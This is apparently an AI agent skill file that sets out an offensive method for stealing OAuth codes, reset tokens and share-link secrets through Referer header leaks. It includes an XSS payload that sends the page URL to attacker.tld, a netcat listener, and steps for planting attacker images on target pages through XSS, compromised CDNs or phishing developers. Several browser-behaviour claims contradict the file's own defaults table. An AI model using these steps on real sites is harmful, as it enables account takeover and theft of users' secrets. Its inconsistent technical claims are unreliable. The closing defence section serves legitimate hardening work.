---
name: offensive-referrer-policy-leak
description: "Referrer-Policy URL/token leak exploitation when the header is absent or set to no-referrer-when-downgrade (the browser default). Covers OAuth code interception, password-reset token leak, share-link enumeration, third-party widget exfiltration, and well-known historical cases (GitHub OAuth 2014, Atlassian 2017, Slack 2020)."
---

# Referrer-Policy Leak — Offensive Methodology

## Quick Workflow

1. Confirm the target serves no `Referrer-Policy` header on the sensitive page.
2. Find a sensitive value that lives in the URL: OAuth `code` / `state`,
   password-reset `token`, share-link ID, session ID in path.
3. Embed an attacker-controlled subresource (image / font / script / CSS) on
   the sensitive page — directly via an existing XSS sink, or indirectly via a
   permissive site that the target itself loads.
4. Watch the inbound `Referer` header on the attacker server.

---

## Browser Defaults Matter

When `Referrer-Policy` is absent:

| Navigation | Default policy | Referer sent? |
|---|---|---|
| HTTPS → HTTPS (same-origin) | `strict-origin-when-cross-origin` (modern) | **Full URL** |
| HTTPS → HTTPS (cross-origin) | `strict-origin-when-cross-origin` | Origin only |
| HTTPS → HTTP | (anything except `unsafe-url`/`no-referrer-when-downgrade`) | Stripped |
| Subresource request (same-origin) | Inherits page policy | **Full URL** (default) |
| Subresource request (cross-origin) | Inherits page policy | Origin only (modern) |

**Old browsers / WebViews** still default to `no-referrer-when-downgrade` which
sends the full URL for any HTTPS → HTTPS request — including cross-origin
subresources. Mobile and embedded WebViews are the highest-risk surface.

---

## Detection

```bash
# 1. Header probe
curl -skI https://target.tld/oauth/callback | grep -i referrer-policy

# 2. Sensitive URL patterns to look for
#    OAuth callbacks, password reset links, share links, magic-login links
curl -s https://target.tld/login | grep -oE 'oauth/callback\?[^"]+'

# 3. Network test — open the sensitive page, watch every outbound request
#    in DevTools → Network → Headers → Request Headers → Referer
```

Vulnerable signals:

* No `Referrer-Policy` on the page that handles `?reset_token=...`
* No `Referrer-Policy` on the OAuth callback
* Page loads 3rd-party JS/images/fonts from CDNs (the Referer goes to them)
* `Referrer-Policy: unsafe-url` — explicitly broken
* `Referrer-Policy: no-referrer-when-downgrade` — broken for HTTPS-only third parties

---

## Exploit Primitives

### 1. OAuth Code Interception via 3rd-Party Widget

The OAuth callback URL is `https://target.tld/oauth/callback?code=AUTH_CODE`.
If that page loads any 3rd-party asset (analytics, font, image, Stripe.js,
Intercom widget), the browser sends:

```
GET /font.woff2 HTTP/1.1
Host: cdn.attacker-controlled.tld
Referer: https://target.tld/oauth/callback?code=AUTH_CODE
```

If you control any asset embedded in that callback page (even indirectly via
a compromised CDN, supply chain attack on a JS package, or by phishing a dev
to inject a single `<img>`), you capture the code.

### 2. Password Reset Token Leak

Classic Atlassian-style bug:

```
Sensitive URL: https://target.tld/reset?token=AAA-BBB-CCC
Page embeds:   <img src="https://3rdparty-cdn.tld/logo.png">
3rdparty logs: Referer: https://target.tld/reset?token=AAA-BBB-CCC
```

Mitigations the target may have forgotten:

* Token in URL query string (instead of POST body + cookie)
* No `Referrer-Policy: no-referrer` on the reset page
* Logo/image hosted on a third-party CDN whose logs are accessible

### 3. Share-Link Enumeration

Sites like file-sharing tools, document collaboration, or "view-only" links
encode the share secret in the URL:

```
https://target.tld/share/r4Nd0mS3cr3tT0k3n
```

If that page loads any 3rd-party resource (Disqus comments, ads, analytics,
Google Fonts, Intercom), and `Referrer-Policy` is permissive, the secret
leaks to every embedded origin.

### 4. Cross-Site XSS → Self-Inflicted Referer

Even without 3rd-party widgets: if you have any XSS sink on the same page
that processes the secret URL, inject:

```js
new Image().src = 'https://attacker.tld/r?' + encodeURIComponent(location.href);
```

But more subtle (no XSS needed): if the target itself ever links out to your
attacker domain (e.g. "Report a problem" link with `target="_blank"`):

```html
<a href="https://attacker.tld">Report this page</a>
```

Click sends the user (and the secret URL in Referer) to your domain.

### 5. Self-XSS → Token Steal Without Direct Compromise

If the target has a "share via email" feature that puts the share URL into a
mailto: link, victims who click it then later browse to your site leak the
URL via Referer chain (browser-dependent).

---

## Historical Cases (Cite in Reports)

* **GitHub 2014 — OAuth Referer leak via embedded Camo image proxy.**
  Image URLs embedded in repo READMEs sent OAuth callback URLs to Camo.
* **Atlassian 2017 — Password reset URL leaked via embedded Google Fonts.**
  Reset page loaded Google Fonts; reset token leaked to Google's font CDN logs.
* **Slack 2020 — Workspace invite tokens leaked via embedded 3rd-party widgets.**
  Public Slack workspace invite URLs were shared with all embedded vendors.
* **Numerous SSO providers** — SAMLResponse / state parameters leaked via
  conversion-tracking pixels on the callback page.

---

## PoC Skeleton (Self-Hosted)

```bash
# 1. Set up a logging endpoint
python3 -m http.server 8000 &
# OR more useful: nc with verbose
nc -lvnp 80

# 2. Deliver the asset (image works best — auto-loads, no user interaction)
#    Get it embedded on a sensitive target page via:
#    a) Existing XSS that injects <img src="http://attacker.tld/r.gif">
#    b) Compromised 3rd-party CDN the target already trusts
#    c) Persistent storage on the target (forum avatar, README, etc.)

# 3. Watch logs for Referer headers with secrets
tail -f /var/log/nginx/access.log | grep -i referer
```

---

## Defences You Are Testing Against

```http
Referrer-Policy: strict-origin-when-cross-origin
```

For sensitive flows (reset, OAuth, share):

```http
Referrer-Policy: no-referrer
```

Plus:

* Move secrets out of the URL — use POST + cookies, or short-lived single-use
  tokens with server-side state
* Avoid 3rd-party subresources on sensitive pages entirely
* `rel="noreferrer"` on every outbound link
* Self-host fonts, analytics, images — no cross-origin asset on reset/OAuth pages
